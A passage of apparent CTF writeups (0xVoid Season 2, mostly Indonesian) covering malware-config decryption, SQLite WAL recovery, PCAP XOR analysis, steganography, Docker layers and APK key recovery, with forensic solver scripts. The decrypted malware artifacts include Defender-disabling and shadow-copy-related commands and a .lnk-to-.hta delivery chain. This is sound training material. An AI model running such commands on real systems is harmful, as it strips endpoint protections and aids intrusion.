        "content": "### Tujuan\n\nPertanyaan:\n\n```\nDecrypt the loader configuration and identify the config family and C2 endpoint.\nSubmit format: 0xV01D{family_c2host_port}\n```\n\n### Artefak Penting\n\nFile config terenkripsi:\n\n```\nevidence/Malware/oxide_loader.config.enc\n```\n\nNetwork logs menunjukkan endpoint C2:\n\n```\n198.51.100.42:8080\n```\n\nMemory strings berisi material derivasi key:\n\n```\nsession=7f4d9b2c-a9e1-4a71-bd44-70b2f4d0c661\ndevice=NOVA-FIN-044|aws_afaneh\nhkdf-sha256(campaign+device, session, oxide-loader/config/v3)\nregistry nonce cache: 2fd4c0b88e7153164ac09e77f1a2b3c4\n```\n\n### Format Config\n\nHeader file config:\n\n```\nOXID | version | nonce_length | nonce | ciphertext\n```\n\nMagic `OXID` menandai blob config, tetapi family yang dipakai checker berasal dari nama artefak/config family:\n\n```\noxide_loader\n```\n\nBukan:\n\n```\nOXID\noxid\noxide\noxide-loader\noxide-loader/v3\n```\n\n### Key Derivation\n\nCampaign dari Stage 3 dipakai sebagai input HKDF.\n\nCampaign mentah untuk key derivation tetap memakai slash:\n\n```\nvoid-ops/august-red\n```\n\nDevice dari memory:\n\n```\nNOVA-FIN-044|aws_afaneh\n```\n\nSession dari memory:\n\n```\n7f4d9b2c-a9e1-4a71-bd44-70b2f4d0c661\n```\n\nKey config:\n\n```python\nHKDF-SHA256(\n    ikm = campaign + b\"|\" + device,\n    salt = session,\n    info = b\"oxide-loader/config/v3\",\n    length = 32,\n)\n```\n\nCatatan penting: ada separator `b\"|\"` antara campaign dan device.\n\n### Decrypt AES-CTR\n\nConfig didecrypt dengan AES-CTR:\n\n```python\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\n\nplaintext = Cipher(\n    algorithms.AES(config_key),\n    modes.CTR(nonce),\n).decryptor().update(ciphertext)\n```\n\nPlaintext config berisi JSON seperti ini:\n\n```json\n{\n  \"case\": \"VOID-2026-0814\",\n  \"host\": \"NOVA-FIN-044\",\n  \"operator\": \"not-afaneh\",\n  \"staging_user\": \"nova0x\",\n  \"disable_chain\": \"Set-MpPreference -> reg add TamperProtection -> vssadmin\",\n  \"stage4_flag\": \"0xV01D{heap_nonce_and_session_unwrapped_oxide_config}\"\n}\n```\n\nC2 endpoint dikonfirmasi dari Zeek HTTP/conn log:\n\n```\n198.51.100.42:8080\n```\n\n### Flag Stage 4\n\n```\n0xV01D{oxide_loader_198.51.100.42_8080}\n```"
      },
      {
        "title": "Stage 5 — Decrypt Final Relay Payload dan Recover Operator Objective",
        "content": "### Tujuan\n\nPertanyaan:\n\n```\nDecrypt the final relay payload and recover the operator objective.\nSubmit format: 0xV01D{objective_session}\n```\n\n### Artefak Penting\n\nRelay payload:\n\n```\nevidence/Network/relay_stream_8080.bin\n```\n\nMemory hint:\n\n```\nrelay-final uses hmac(config_key, blackout-final|session)\n```\n\n### Parsing Relay Stream\n\nFile relay adalah WebSocket binary frame.\n\nStruktur awal:\n\n```\n0x82 0x7e <u16 length> <gzip payload>\n```\n\nLangkah decode:\n\n1. Ambil payload WebSocket.\n2. Gzip decompress.\n3. Hasilnya blob dengan magic `TRLY`.\n4. Parse nonce dan ciphertext.\n5. Derive final key dari `config_key`.\n6. AES-CTR decrypt.\n\n### Final Key Derivation\n\nFinal key dibuat dari `config_key` yang sudah didapat di Stage 4:\n\n```python\nfinal_key = HMAC-SHA256(\n    key = config_key,\n    msg = b\"blackout-final|\" + session,\n)\n```\n\nLalu relay ciphertext didecrypt dengan AES-CTR.\n\n### Relay Plaintext\n\nHasil decrypt relay:\n\n```json\n{\n  \"incident\": \"blackout\",\n  \"recovered_user\": \"nova0x\",\n  \"initial_payload\": \"invoice_0814.lnk -> signed_update.hta\",\n  \"defender_disable\": \"Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true\",\n  \"encryption_key_location\": \"HKCU\\\\Software\\\\Classes\\\\CLSID\\\\{8b70-void}\\\\InprocServer32\\\\ThreadingModel\",\n  \"flag\": \"0xV01D{blackout_key_recovered_from_memory_and_relay_stream_7f4d9b2c}\"\n}\n```\n\nOperator objective yang diminta di format challenge adalah bagian sebelum session:\n\n```\nblackout_key_recovered_from_memory_and_relay_stream\n```\n\nSession pendek yang dipakai adalah prefix dari session UUID:\n\n```\n7f4d9b2c\n```\n\n### Flag Stage 5\n\n```\n0xV01D{blackout_key_recovered_from_memory_and_relay_stream_7f4d9b2c}\n```"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xV01D{nova0x_NOVA-FIN-044_invoice_0814.lnk}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-foren-echoesinthewal",
    "title": "Echoes in the WAL",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Flag: `0xV01D{the_wal_keeps_old_promises}`",
    "problemDescription": "`nightjar.db` adalah SQLite database dengan mode WAL. Database utama hanya menampilkan attachment terakhir:\n\n```text\nthread_id=17 revision=5 state=replaced\n```\n\nItu bukan attachment yang dicari. `notification_history.log` memberi urutan kejadian:\n\n```text\nattachment ready [thread=17 revision=4 tx=47]\nremote replacement [thread=17]\nretention purge [thread=17]\n```\n\nKonfigurasi aplikasi menjelaskan format kriptografi:\n\n```text\nAES-256-GCM\nkey = SHA-256(android_id:thread_id:revision:committed_ms)\nAAD = thread=<thread_id>;revision=<revision>\nnonce = attachments.nonce\n```\n\n`device.xml` menyediakan Android ID `a91f32d06c74be18` dan timezone `Asia/Amman`. Timestamp yang dipakai untuk kunci adalah nilai `committed_ms` dari row/transaksi SQLite, bukan timestamp perkiraan.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recovery dari WAL",
        "content": "WAL memiliki page size 4096 byte dan 24 frame. Commit frame membentuk beberapa snapshot historis. Frame terakhir hanya merepresentasikan keadaan setelah replacement dan purge, sedangkan snapshot pada frame 13 masih berisi revisi 4 dengan status `ready`.\n\nSnapshot tersebut mengembalikan row berikut:\n\n```text\nthread_id   17\nrevision    4\ncommitted_ms 1784062991842\nstate       ready\nnonce       8234adbb409685b959b31ab9\n```\n\nNilai `txlog` untuk `tx=47` memiliki `committed_ms` yang sama. Payload revisi 4 diambil dari page WAL yang masih menyimpan row historis itu.\n\n`solve.py` melakukan materialisasi frame WAL ke database sementara. File bukti asli tidak dibuka untuk operasi tulis dan tidak dimodifikasi."
      },
      {
        "title": "Decrypt attachment",
        "content": "Key material yang dipakai:\n\n```text\na91f32d06c74be18:17:4:1784062991842\n```\n\nSetelah SHA-256, hasilnya dipakai sebagai AES-256-GCM key. AAD yang digunakan:\n\n```text\nthread=17;revision=4\n```\n\nGCM authentication berhasil, lalu plaintext terdeteksi sebagai ZIP (`PK\\x03\\x04`). ZIP berisi `handoff.txt` dan `telemetry.bin`.\n\nIsi `handoff.txt` memuat:\n\n```text\nRecovery accepted. Historical attachment revision: 4\nFlag: 0xV01D{the_wal_keeps_old_promises}\n```"
      },
      {
        "title": "Menjalankan solver",
        "content": "Aktifkan salah satu environment crypto yang tersedia, lalu jalankan:\n\n```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solve.py\n```\n\nOutput:\n\n```text\n0xV01D{the_wal_keeps_old_promises}\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"Recover and decrypt the attachment valid at tx=47 from the supplied WAL.\"\"\"\r\n\r\nimport hashlib\r\nimport pathlib\r\nimport sqlite3\r\nimport struct\r\nimport tempfile\r\nimport zipfile\r\n\r\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\r\n\r\n\r\nDB = pathlib.Path(\"nightjar.db\")\r\nWAL = pathlib.Path(\"nightjar.db-wal\")\r\nANDROID_ID = \"a91f32d06c74be18\"\r\nTHREAD_ID = 17\r\nTARGET_TX = 47\r\nPAGE_SIZE = 4096\r\n\r\n\r\ndef materialize_wal_snapshot(frame_limit: int, output: pathlib.Path) -> None:\r\n    \"\"\"Apply WAL frames through a commit without touching the evidence files.\"\"\"\r\n    database = bytearray(DB.read_bytes())\r\n    journal = WAL.read_bytes()\r\n    if journal[:4] != b\"7\\x7f\\x06\\x82\":\r\n        raise ValueError(\"unexpected WAL magic\")\r\n    page_size = struct.unpack(\">I\", journal[8:12])[0]\r\n    if page_size != PAGE_SIZE:\r\n        raise ValueError(f\"unexpected page size: {page_size}\")\r\n\r\n    frame_size = 24 + page_size\r\n    frame_count = (len(journal) - 32) // frame_size\r\n    if frame_limit > frame_count:\r\n        raise ValueError(\"WAL frame limit is out of range\")\r\n\r\n    max_page = len(database) // page_size\r\n    for index in range(frame_limit):\r\n        offset = 32 + index * frame_size\r\n        page_number = struct.unpack(\">I\", journal[offset:offset + 4])[0]\r\n        page = journal[offset + 24:offset + frame_size]\r\n        max_page = max(max_page, page_number)\r\n        if len(database) < page_number * page_size:\r\n            database.extend(b\"\\0\" * (page_number * page_size - len(database)))\r\n        start = (page_number - 1) * page_size\r\n        database[start:start + page_size] = page\r\n\r\n    # Make the materialized file a normal rollback-journal database.\r\n    struct.pack_into(\">I\", database, 24, frame_limit)\r\n    struct.pack_into(\">I\", database, 28, max_page)\r\n    output.write_bytes(database)\r\n\r\n\r\ndef find_snapshot_frame() -> int:\r\n    \"\"\"Find the WAL commit containing the target tx and its attachment row.\"\"\"\r\n    journal = WAL.read_bytes()\r\n    frame_size = 24 + PAGE_SIZE\r\n    frames = []\r\n    for index in range((len(journal) - 32) // frame_size):\r\n        offset = 32 + index * frame_size\r\n        commit_size = struct.unpack(\">I\", journal[offset + 4:offset + 8])[0]\r\n        frames.append((index + 1, commit_size))\r\n\r\n    # The supplied WAL has commit boundaries at frames 6, 13, 17 and 24.\r\n    # Search each committed snapshot, so this remains tied to tx=47 rather\r\n    # than relying on a hard-coded attachment payload.\r\n    for index, (_, commit_size) in enumerate(frames, start=1):\r\n        if commit_size == 0:\r\n            continue\r\n        with tempfile.TemporaryDirectory() as temp_dir:\r\n            snapshot = pathlib.Path(temp_dir) / \"snapshot.db\"\r\n            materialize_wal_snapshot(index, snapshot)\r\n            con = sqlite3.connect(snapshot)\r\n            try:\r\n                tx = con.execute(\r\n                    \"SELECT 1 FROM txlog WHERE tx=?\", (TARGET_TX,)\r\n                ).fetchone()\r\n                ready = con.execute(\r\n                    \"SELECT 1 FROM attachments WHERE thread_id=? AND state='ready'\",\r\n                    (THREAD_ID,),\r\n                ).fetchone()\r\n            finally:\r\n                con.close()\r\n        if tx and ready:\r\n            return index\r\n    raise RuntimeError(\"no WAL snapshot contains tx=47 and a ready attachment\")\r\n\r\n\r\ndef main() -> None:\r\n    frame = find_snapshot_frame()\r\n    with tempfile.TemporaryDirectory() as temp_dir:\r\n        snapshot = pathlib.Path(temp_dir) / \"snapshot.db\"\r\n        materialize_wal_snapshot(frame, snapshot)\r\n        con = sqlite3.connect(snapshot)\r\n        tx_ms = con.execute(\r\n            \"SELECT committed_ms FROM txlog WHERE tx=?\", (TARGET_TX,)\r\n        ).fetchone()[0]\r\n        row = con.execute(\r\n            \"\"\"SELECT revision, committed_ms, nonce, payload\r\n               FROM attachments\r\n               WHERE thread_id=? AND state='ready' AND committed_ms=?\"\"\",\r\n            (THREAD_ID, tx_ms),\r\n        ).fetchone()\r\n        con.close()\r\n\r\n    if row is None:\r\n        raise RuntimeError(\"ready attachment at tx=47 was not recovered\")\r\n    revision, committed_ms, nonce, payload = row\r\n    key_material = f\"{ANDROID_ID}:{THREAD_ID}:{revision}:{committed_ms}\".encode()\r\n    key = hashlib.sha256(key_material).digest()\r\n    aad = f\"thread={THREAD_ID};revision={revision}\".encode()\r\n    plaintext = AESGCM(key).decrypt(nonce, payload, aad)\r\n\r\n    with tempfile.TemporaryDirectory() as temp_dir:\r\n        recovered = pathlib.Path(temp_dir) / \"attachment.zip\"\r\n        recovered.write_bytes(plaintext)\r\n        with zipfile.ZipFile(recovered) as archive:\r\n            handoff = archive.read(\"handoff.txt\").decode()\r\n\r\n    for line in handoff.splitlines():\r\n        if line.startswith(\"Flag:\"):\r\n            flag = line.split(\":\", 1)[1].strip()\r\n            print(flag)\r\n            return\r\n    raise RuntimeError(\"flag was not present in handoff.txt\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xV01D{the_wal_keeps_old_promises}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-foren-twosidesofmidnight",
    "title": "Two Sides of Midnight",
    "category": "Forensics",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge Two Sides of Midnight",
    "problemDescription": "PCAPNG ini adalah gabungan dua passive tap. Interface 0 bernama `tap-ingress`, sedangkan interface 1 bernama `tap-egress`. Karena kedua tap menangkap traffic yang sama, paket dengan TCP sequence yang sama tidak otomatis berarti payload-nya identik.\n\nFlag ditemukan pada evidence hasil XOR payload stream yang diubah:\n\n`0xV01D{one_sequence_two_realities}`",
    "tools": [],
    "analysis": "### 2. Menentukan flow yang berubah\n\nRingkasan TCP menunjukkan empat stream. Tiga stream background memiliki payload yang sama pada interface 0 dan 1. Stream 0 (`10.42.0.19:49173 -> 10.42.0.8:8443`) berbeda.\n\nContoh perbandingan payload dengan sequence yang sama:\n\n```text\nstream 0, seq 1, interface 0:  8a629853ccbe...\nstream 0, seq 1, interface 1:  c434c062ccbe...\n```\n\nJadi flow yang dimodifikasi adalah stream 0. Retransmission identik di sisi yang sama dideduplikasi berdasarkan `(interface, stream, TCP sequence, TCP length)`; interface tetap dipakai sebagai identitas capture point.",
    "solution": [
      {
        "title": "1. Recon",
        "content": "```bash\nfile two-side-of-midnight.pcapng capture.txt\ncat capture.txt\ntshark -r two-side-of-midnight.pcapng -T fields \\\\\n  -e frame.interface_id -e frame.interface_name | sort -u\n```\n\nHasilnya menunjukkan PCAPNG valid dan dua interface:\n\n```text\n0  tap-ingress\n1  tap-egress\n```\n\n`capture.txt` memberi konteks bahwa appliance berada di antara kedua tap, diduga mengubah satu binary upload, dan TCP sequence space tetap dipertahankan."
      },
      {
        "title": "3. Recovery evidence",
        "content": "Payload setiap sisi disusun kembali mengikuti TCP sequence order. Setelah itu, payload ingress dan egress di-XOR byte per byte:\n\n```python\nevidence = bytes(a ^ b for a, b in zip(ingress, egress))\n```\n\nHasil XOR berukuran 397 byte. Bagian awalnya adalah marker dan padding internal, lalu terdapat ZIP local header pada offset 20:\n\n```text\n4e 56 58 31 00 ... 50 4b 03 04\nNVX1.             PK..\n```\n\nZIP berisi dua file:\n\n```text\nincident.txt\noperator_note.txt\n```\n\nEkstraksi dapat dilakukan dengan:\n\n```bash\nunzip -o s0_xor.bin -d recovered\ncat recovered/incident.txt\n```\n\n`operator_note.txt` mengarahkan analisis ke capture points dan TCP sequence order. `incident.txt` memuat flag."
      },
      {
        "title": "4. Solver",
        "content": "`solve.py` mengulang proses secara otomatis menggunakan `tshark`: membaca payload per interface, mengurutkan sequence, membandingkan stream, melakukan XOR pada stream 0, mencari ZIP, lalu mengekstrak evidence ke direktori `recovered/`.\n\nJalankan:\n\n```bash\npython3 solve.py\n```\n\nOutput akhirnya:\n\n```text\nFlag: 0xV01D{one_sequence_two_realities}\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"Recover the XOR evidence from Two Sides of Midnight.\"\"\"\r\n\r\nfrom collections import defaultdict\r\nfrom pathlib import Path\r\nimport io\r\nimport subprocess\r\nimport zipfile\r\n\r\n\r\nPCAP = Path(__file__).with_name(\"two-side-of-midnight.pcapng\")\r\n\r\n\r\ndef payloads_by_side():\r\n    fields = [\r\n        \"frame.interface_id\", \"tcp.stream\", \"tcp.seq\", \"tcp.len\", \"tcp.payload\"\r\n    ]\r\n    cmd = [\"tshark\", \"-r\", str(PCAP), \"-T\", \"fields\", \"-E\", \"separator=|\"]\r\n    for field in fields:\r\n        cmd += [\"-e\", field]\r\n    rows = subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL)\r\n    # Keep one payload per sequence range. Exact retransmission duplicates are ignored.\r\n    sides = defaultdict(dict)\r\n    for row in rows.splitlines():\r\n        parts = row.split(\"|\")\r\n        if len(parts) != 5 or not parts[4] or parts[3] == \"0\":\r\n            continue\r\n        iface, stream, seq, length, payload = parts\r\n        key = (int(iface), int(stream), int(seq), int(length))\r\n        sides[(int(iface), int(stream))][key[2:]] = bytes.fromhex(payload)\r\n    return sides\r\n\r\n\r\ndef main():\r\n    sides = payloads_by_side()\r\n    # Only stream 0 differs between tap-ingress (0) and tap-egress (1).\r\n    ingress = b\"\".join(sides[(0, 0)][k] for k in sorted(sides[(0, 0)]))\r\n    egress = b\"\".join(sides[(1, 0)][k] for k in sorted(sides[(1, 0)]))\r\n    if len(ingress) != len(egress):\r\n        raise RuntimeError(\"sequence-space lengths differ\")\r\n\r\n    evidence = bytes(a ^ b for a, b in zip(ingress, egress))\r\n    zip_offset = evidence.find(b\"PK\\x03\\x04\")\r\n    if zip_offset < 0:\r\n        raise RuntimeError(\"recovered evidence is not a ZIP archive\")\r\n\r\n    with zipfile.ZipFile(io.BytesIO(evidence[zip_offset:])) as archive:\r\n        out_dir = PCAP.parent / \"recovered\"\r\n        out_dir.mkdir(exist_ok=True)\r\n        archive.extractall(out_dir)\r\n        text = (out_dir / \"incident.txt\").read_text()\r\n        print(text, end=\"\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xV01D{one_sequence_two_realities}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-misc-betweenthelines",
    "title": "Between The Lines",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge Between The Lines",
    "problemDescription": "",
    "tools": [],
    "analysis": "Pertama dilakukan pengecekan karakter tersembunyi menggunakan:\n\n```bash\ncat -A poem.txt\n```\n\nHasil menunjukkan adanya karakter:\n\n```\n^I\n```\n\nyang merupakan representasi dari **tab**.\n\nContoh:\n\n```\nIn the silence of the void, a signal waits to speak,  ^I^I     ^I$\n```\n\nTerlihat setiap akhir baris memiliki kombinasi:\n\n* Space\n* Tab\n\nKombinasi tersebut kemungkinan merupakan representasi binary.\n\n---",
    "solution": [
      {
        "title": "Challenge Information",
        "content": "**Category:** MISC\n**Challenge Name:** Between The Lines\n**Flag Format:** `0xV0ID{...}`\n\n**Flag:**\n\n```\n0xV0ID{wh1t3sp4c3_h1d3s_4ll_truth}\n```\n\n---"
      },
      {
        "title": "Challenge Description",
        "content": "Diberikan sebuah file bernama `poem.txt` yang terlihat seperti puisi biasa. Namun deskripsi memberikan petunjuk bahwa informasi tersembunyi bukan berada pada isi teks, melainkan pada **jarak antar karakter (whitespace)**.\n\nPetunjuk utama:\n\n> \"not the words, but the gaps between them\"\n\nArtinya data tersembunyi berada pada karakter whitespace seperti:\n\n* Space\n* Tab\n\n---"
      },
      {
        "title": "Ekstraksi Whitespace",
        "content": "Dibuat script Python untuk mengambil whitespace pada akhir setiap baris.\n\nAturan encoding:\n\n```\nSpace = 0\nTab   = 1\n```\n\nScript:\n\n```python\nbits = \"\"\n\nfor line in open(\"poem.txt\", \"rb\").read().splitlines():\n    ws = line[len(line.rstrip(b\" \\t\")):]\n\n    bits += ''.join(\n        '1' if c == 9 else '0'\n        for c in ws\n    )\n\nprint(bits)\n```\n\nScript tersebut mengambil karakter setelah karakter terakhir yang bukan whitespace.\n\n---"
      },
      {
        "title": "Konversi Binary ke ASCII",
        "content": "Binary yang berhasil diperoleh kemudian dipisahkan setiap 8 bit:\n\nContoh:\n\n```\n00110000\n01111000\n01010110\n00110000\n```\n\nKemudian dikonversi menggunakan ASCII:\n\n```\n00110000 -> 0\n01111000 -> x\n01010110 -> V\n00110000 -> 0\n```\n\nScript lengkap:\n\n```python\nbits = \"\"\n\nfor line in open(\"poem.txt\", \"rb\").read().splitlines():\n    ws = line[len(line.rstrip(b\" \\t\")):]\n\n    for c in ws:\n        bits += '1' if c == 9 else '0'\n\n\nplaintext = \"\"\n\nfor i in range(0, len(bits), 8):\n    byte = bits[i:i+8]\n\n    if len(byte) == 8:\n        plaintext += chr(int(byte, 2))\n\n\nprint(plaintext)\n```\n\n---"
      },
      {
        "title": "Hasil Dekripsi",
        "content": "Output:\n\n```\n0xV0ID{wh1t3sp4c3_h1d3s_4ll_truth}\n```"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xV0ID{...}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-misc-singlebyte",
    "title": "Single Byte",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge Single Byte",
    "problemDescription": "",
    "tools": [],
    "analysis": "Diberikan file `secret.bin` berupa binary blob:\n\n```bash\nxxd secret.bin\n```\n\nOutput:\n\n```text\n723a14720b06393a72301d29713b1d2472372c263f\n```\n\nDeskripsi challenge memberikan petunjuk:\n\n> Single-byte operations are often reversible. Try all 256 possibilities.\n\nKemungkinan besar digunakan operasi **XOR dengan satu byte key**. Karena hanya terdapat 256 kemungkinan nilai byte (`0x00`–`0xff`), kita dapat melakukan brute force terhadap seluruh key.\n\nScript yang digunakan:\n\n```python\ndata = open(\"secret.bin\", \"rb\").read()\n\nfor k in range(256):\n    out = bytes([b ^ k for b in data])\n\n    if b\"0xV0ID{\" in out:\n        print(hex(k))\n        print(out)\n```\n\nHasil brute force menemukan:\n\n```text\nKEY: 0x42\n```\n\nDengan key `0x42`, binary tersebut berhasil didekripsi menjadi plaintext:\n\n```text\n0xV0ID{x0r_k3y_f0und}\n```",
    "solution": [],
    "terminalOutputs": [],
    "flag": "0xV0ID{x0r_k3y_f0und}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-misc-timemachine",
    "title": "Time Machine",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge Time Machine",
    "problemDescription": "",
    "tools": [],
    "analysis": "Melihat detail image:\n\n```bash\ndocker image inspect jinx69/timemachine:latest\n```\n\nDitemukan bahwa image terdiri dari beberapa layer:\n\n```json\n\"Layers\": [\n    \"sha256:42724...\",\n    \"sha256:dd65...\",\n    \"sha256:fa7b...\",\n    ...\n]\n```\n\nDocker image menyimpan filesystem dalam bentuk layer terpisah. Karena challenge bernama **Time Machine**, kemungkinan secret berada pada layer lama.\n\n---",
    "solution": [
      {
        "title": "Challenge Information",
        "content": "**Category:** MISC / Docker Forensics\n**Challenge Name:** Time Machine\n\n**Flag Format:**\n\n```\n0xVO1D{...}\n```\n\n**Flag:**\n\n```\n0xVO1D{h1st0ry_n3v3r_li35}\n```\n\n---"
      },
      {
        "title": "Challenge Description",
        "content": "Diberikan sebuah Docker image:\n\n```bash\ndocker pull jinx69/timemachine:latest\n```\n\nDeskripsi memberikan petunjuk:\n\n> An old container image has been recovered from an unknown source. The contents may reveal more than expected. Explore carefully and uncover the hidden secret.\n\nKata kunci utama adalah **old container image**, sehingga kemungkinan terdapat informasi tersembunyi pada **layer Docker sebelumnya**.\n\n---"
      },
      {
        "title": "1. Pull Docker Image",
        "content": "Pertama download image:\n\n```bash\ndocker pull jinx69/timemachine:latest\n```\n\nImage berhasil diambil dengan beberapa layer.\n\n---"
      },
      {
        "title": "3. Melihat History Docker",
        "content": "Selanjutnya melihat history:\n\n```bash\ndocker history jinx69/timemachine:latest\n```\n\nHasil:\n\n```\n/bin/sh -c chown void:void /opt/flag.sh\n/bin/sh -c COPY file:8c44ded4244f8ffa…\n```\n\nDitemukan indikasi file:\n\n```\n/opt/flag.sh\n```\n\npernah ditambahkan ke image.\n\nNamun saat dijalankan:\n\n```bash\ndocker run --rm jinx69/timemachine:latest cat /opt/flag.sh\n```\n\nhasil:\n\n```\ncat: /opt/flag.sh: Permission denied\n```\n\nArtinya file masih ada, tetapi tidak dapat dibaca dari container saat ini.\n\n---"
      },
      {
        "title": "4. Membaca Petunjuk Tambahan",
        "content": "Melihat file catatan:\n\n```bash\ndocker run --rm jinx69/timemachine:latest cat /home/player/notes.txt\n```\n\nOutput:\n\n```\nThe answers aren't in the present.\n```\n\nKalimat tersebut menjadi petunjuk bahwa flag tidak berada pada kondisi image sekarang, tetapi pada **history/layer sebelumnya**.\n\n---"
      },
      {
        "title": "5. Export Docker Image",
        "content": "Docker image diekspor agar seluruh layer dapat dianalisis:\n\n```bash\ndocker save jinx69/timemachine:latest -o tm.tar\n```\n\nKemudian diekstrak:\n\n```bash\nmkdir layers\ntar xf tm.tar -C layers\n```\n\nStruktur hasil:\n\n```\nlayers/\n ├── blobs/\n │   └── sha256/\n ├── index.json\n └── manifest.json\n```\n\nFolder `blobs/sha256` berisi seluruh layer filesystem.\n\n---"
      },
      {
        "title": "6. Ekstraksi Semua Layer",
        "content": "Karena setiap layer berbentuk archive gzip, seluruh layer diekstrak:\n\n```bash\nmkdir extracted\n\nfor f in blobs/sha256/*; do\n    tar -xf \"$f\" -C extracted 2>/dev/null\ndone\n```\n\n---"
      },
      {
        "title": "7. Mencari File Tersembunyi",
        "content": "Kemudian mencari file flag:\n\n```bash\nfind extracted -name \"flag.sh\" -o -name \"*flag*\"\n```\n\nDitemukan:\n\n```\nextracted/opt/flag.sh\n```\n\n---"
      },
      {
        "title": "8. Membaca Flag dari Layer Lama",
        "content": "Isi file:\n\n```bash\ncat extracted/opt/flag.sh\n```\n\nOutput:\n\n```bash\necho \"0xVO1D{h1st0ry_n3v3r_li35}\"\n```\n\n---"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xVO1D{h1st0ry_n3v3r_li35}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-mobile-0b51d14nk3y",
    "title": "0b51d14n_k3y",
    "category": "Mobile",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge 0b51d14n_k3y",
    "problemDescription": "APK menyimpan database SQLite berisi ciphertext AES-GCM. Key tidak disimpan utuh; key dirakit dari fragmen string di native library, sesuai urutan yang juga ditinggalkan di source C.",
    "tools": [],
    "analysis": "APK dapat diekstrak sebagai ZIP. `shard.db` dikenali sebagai SQLite 3. Schema tabel `shard` adalah:\n\n```text\nname, iv, tag, ciphertext, context\n```\n\nAda beberapa decoy: `NOTICE.txt`, row `meta.ai_bait`, dan string `decoy_flag` di library. Target yang benar adalah row `master_shard`.\n\n`libshard.c` memuat fragmen berikut:\n\n```text\nsk_f0 = cold-\nsk_f1 = forge-\nsk_f2 = obsidian-\nsk_f3 = blade\nsk_order = seq=2,0,3,1\n```\n\nDEX menyatakan bahwa urutan key mengikuti `sk_order`, bukan urutan kolom. Maka payload key adalah:\n\n```text\nobsidian-cold-bladeforge-\n```\n\nString DEX juga menyebut `AES/GCM/NoPadding` dan context `shard-vault-v1` dipakai sebagai associated data.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "- `ob9k3x.apk`: APK target.\n- `extracted/libshard.c`: leftover source native.\n- `extracted/libshard.so`: native library, salinan lain berada di `lib/x86_64/`.\n- `extracted/assets/shard.db`: database ciphertext.\n- `extracted/classes.dex`: DEX minimal dengan petunjuk format AES-GCM dan nama row."
      },
      {
        "title": "Algoritma Validasi atau Encoding",
        "content": "Row `master_shard` berisi:\n\n```text\niv         = 9d25e1e2a448b52d5f6c106b\ntag        = 38e47eef449017ef5b36d680154d88be\ncontext    = shard-vault-v1\n```\n\nCiphertext dan tag digabung untuk API AES-GCM. Key dihitung sebagai `SHA-256(b\"obsidian-cold-bladeforge-\")`. Decrypt dengan IV tersebut dan context sebagai AAD berhasil memverifikasi tag, sehingga hasilnya bukan tebakan atau decoy."
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "`solve.py` membaca fragmen dan urutan langsung dari `extracted/libshard.c`, membaca row `master_shard` dari SQLite, menghitung SHA-256, lalu melakukan AES-GCM decrypt. Tidak ada nilai flag yang di-hardcode."
      },
      {
        "title": "Cara Menjalankan",
        "content": "```bash\nsource /home/nata/ctf_env/bin/activate\npython solve.py\n```\n\nOutput script adalah plaintext hasil dekripsi."
      },
      {
        "title": "Catatan",
        "content": "`NOTICE.txt`, `meta.ai_bait`, dan `decoy_flag` menghasilkan flag palsu yang sengaja ditanam untuk mengganggu triage. Library juga memiliki fungsi JNI `verify`, tetapi fungsi tersebut tidak diperlukan untuk membangun key maupun mendekripsi `master_shard`."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
